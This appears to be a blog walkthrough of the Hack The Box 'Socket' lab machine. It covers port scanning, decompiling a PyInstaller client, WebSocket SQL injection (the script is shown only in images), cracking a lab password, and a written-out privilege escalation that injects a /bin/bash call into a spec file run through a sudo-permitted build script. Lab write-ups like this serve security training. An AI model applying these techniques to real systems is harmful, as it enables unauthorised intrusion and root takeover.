Socket is newly released Open Beta Season Medium, Linux box from hackthebox.

Let’s Start

**Nmap Output**

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 13:35 EDT  
Nmap scan report for qreader.htb (10.10.11.206)  
Host is up (0.079s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)  
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)  
80/tcp   open  http    Apache httpd 2.4.52  
|_http-title: Site doesn't have a title (text/html; charset=utf-8).  
| http-methods:   
|_  Supported Methods: OPTIONS GET HEAD  
| http-server-header:   
|   Apache/2.4.52 (Ubuntu)  
|_  Werkzeug/2.1.2 Python/3.10.6  
5789/tcp open  unknown  
| fingerprint-strings:   
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:   
|     HTTP/1.1 400 Bad Request  
|     Date: Wed, 29 Mar 2023 17:36:42 GMT  
|     Server: Python/3.10 websockets/10.4  
|     Content-Length: 77  
|     Content-Type: text/plain  
|     Connection: close  
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.  
|   Help, SSLSessionReq:   
|     HTTP/1.1 400 Bad Request  
|     Date: Wed, 29 Mar 2023 17:36:58 GMT  
|     Server: Python/3.10 websockets/10.4  
|     Content-Length: 77  
|     Content-Type: text/plain  
|     Connection: close  
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.  
[REDACTED]

add “qreader.htb” in hosts file

Browsing the site it shows something like this

![](https://miro.medium.com/v2/resize:fit:1050/1*hgy-gcdjco6ZFjPIdjndgw.png)

![](https://miro.medium.com/v2/resize:fit:1050/1*7hmNtX4DBLZCxmCEBLAeiA.png)

Download the app , the site is running with flask . so let’s assume the app is also built with python

i’m using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to decompile the app

[

## GitHub — extremecoders-re/pyinstxtractor: PyInstaller Extractor

### PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated executable file. The header…

github.com



](https://github.com/extremecoders-re/pyinstxtractor)

wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py  
  
python pyinstxtractor.py app/qreader.exe

![](https://miro.medium.com/v2/resize:fit:1050/1*NpgZ7vAeFnDvOCQpTTH7DA.png)

pyinstxtracto output

cd to output folder & Extract the pyc file

pip3 install uncompyle6  
  
uncompyle6 qreader.pyc > qreader.py

analyzing the code there is a vulnerability in this part of code

![](https://miro.medium.com/v2/resize:fit:1050/1*xk15z9TngFKvLg9PU-Oypg.png)

Again let’s try out the vulnerability scan of websocket in port 5789 with [STEWS](https://github.com/PalindromeLabs/STEWS)

[

## GitHub — PalindromeLabs/STEWS: A Security Tool for Enumerating WebSockets

### STEWS is a tool suite for security testing of WebSockets This research was first presented at OWASP Global AppSec US…

github.com



](https://github.com/PalindromeLabs/STEWS)

python3 STEWS-vuln-detect.py -1 -n -u qreader.htb:5789

![](https://miro.medium.com/v2/resize:fit:1050/1*zSxfoD9HygCSLSh6-tivwA.png)

Let’s make a script to exploit the sql injection found from from the above source code

![](https://miro.medium.com/v2/resize:fit:1050/1*LKl16AxYTldoBv2Eo8moNg.png)

![](https://miro.medium.com/v2/resize:fit:1050/1*_v-3jqJ1oUF7xI1aRXgO_w.png)

some usernames are found, looks great. 😍

here let’s try to get the password

![](https://miro.medium.com/v2/resize:fit:1050/1*D6CDK3rDUIzeEHjuQBM8fw.png)

![](https://miro.medium.com/v2/resize:fit:1050/1*PnPXS2Hv9vg-2gB6U0JCsw.png)

here is the password which can be easily cracked with crackstation

![](https://miro.medium.com/v2/resize:fit:1050/1*PgAj2JKEZ9aDiRjdF1_sJA.png)

> password: “_denjanjade122566”_

ssh it & get the user.txt

> i’ve to try several times as username is tricky “_tkeller”_

![](https://miro.medium.com/v2/resize:fit:795/1*jqqZwUQCuPRmseIXMDJfzg.png)

uh! initial access done :D

## Privilege Escalation

running “sudo -l” gives this

![](https://miro.medium.com/v2/resize:fit:1050/1*P_0jPszisATldAKnuHpWkg.png)

reviewing the “build-installer.sh” file it seems os command can be run as root.

![](https://miro.medium.com/v2/resize:fit:1050/1*H54EENfAx3py27IPziwKDg.png)

let’s get to the root…

echo 'import os;os.system("/bin/bash")' > b17.spec  
  
sudo /usr/local/sbin/build-installer.sh build b17.spec

![](https://miro.medium.com/v2/resize:fit:1050/1*mczXWMPAx5wI-LyqGP0b0w.png)

& it’s done !